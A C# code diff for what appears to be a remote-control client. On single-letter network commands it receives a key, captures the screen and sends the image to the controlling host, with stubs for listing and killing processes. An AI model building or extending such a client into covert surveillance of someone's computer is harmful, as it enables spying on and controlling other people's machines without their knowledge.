@@ -65,14 +65,19 @@ namespace DA_RSA
             byte[] tmpBuffer = new byte[1024];
             server = new IPEndPoint(IPAddress.Any, 0);
             int tmp = socket.ReceiveFrom(tmpBuffer, ref server);
-            N = BigInteger.Parse(Encoding.Default.GetString(tmpBuffer, 0, tmp));
-            tmp = socket.ReceiveFrom(tmpBuffer, ref server);
-            E = BigInteger.Parse(Encoding.Default.GetString(tmpBuffer, 0, tmp));
-            notifyIcon1.ShowBalloonTip(2000, "Public Key reveiced", "Es wurde einer öffentlicher Schlüssel empfangen", ToolTipIcon.Info);
-            IPEndPoint ipep = (IPEndPoint)server;
-            ipep.Port = 5555;
-            socket.SendTo(Encoding.Default.GetBytes("iwas"),ipep);
-           
+            string cmd = Encoding.Default.GetString(tmpBuffer, 0, 1);
+
+            if (cmd == "a")
+            {
+                N = BigInteger.Parse(Encoding.Default.GetString(tmpBuffer, 1, tmp));
+                int tmp1 = socket.ReceiveFrom(tmpBuffer, ref server);
+                E = BigInteger.Parse(Encoding.Default.GetString(tmpBuffer, 0, tmp1));
+                notifyIcon1.ShowBalloonTip(2000, "Public Key reveiced", "Es wurde einer öffentlicher Schlüssel empfangen", ToolTipIcon.Info);
+                IPEndPoint ipep = (IPEndPoint)server;
+                ipep.Port = 5555;
+                socket.SendTo(Encoding.Default.GetBytes("iwas"), ipep);
+            }
+
         }
         public void Receive2()
         {
@@ -89,15 +94,24 @@ namespace DA_RSA
                     if (length != 0)
                     {
                         string cmd = Encoding.Default.GetString(buffer, 0, length);
-                        if (cmd == "GetScreenshot")
+                        if (cmd == "b")
                         {
                             Bitmap bmp = TakeScreenshot(false);
-                            bmp.Save(Directory.GetCurrentDirectory()+"\\bild.png", ImageFormat.Png);
+                            bmp.Save(Directory.GetCurrentDirectory() + "\\bild.png", ImageFormat.Png);
                             IPEndPoint ipep = (IPEndPoint)server;
                             ipep.Port = 6868;
 
                             send_data_sync(Directory.GetCurrentDirectory() + "\\bild.png", "bild.png", ipep.Address, ipep.Port);
                         }
+                        else if (cmd == "c")
+                        {
+                            //get process
+                        }
+                        else if (cmd == "d")
+                        { 
+                        //get kill process name
+                        }
+                        //string tmp = Environment.GetFolderPath(Environment.SpecialFolder.History);
                     }
                 }
                 catch
